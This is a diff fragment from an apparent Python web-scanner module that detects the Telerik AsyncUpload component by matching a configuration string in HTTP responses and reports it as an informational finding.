+                context="{module} searched HTTP_RESPONSE and identified {event.type}: Telerik DialogHandler",
+            )
+        elif '"_serializedConfiguration":"' in body:
+            await self.emit_event(
+                {
+                    "host": str(event.host),
+                    "url": event.url,
+                    "description": "Telerik AsyncUpload [serializedConfiguration] detected in HTTP response",
+                    "name": "Telerik AsyncUpload",
+                    "confidence": "CONFIRMED",
+                    "severity": "INFO",
+                },
+                "FINDING",
+                event,
+                context="{module} searched HTTP_RESPONSE and identified {event.type}: Telerik AsyncUpload",
+            )
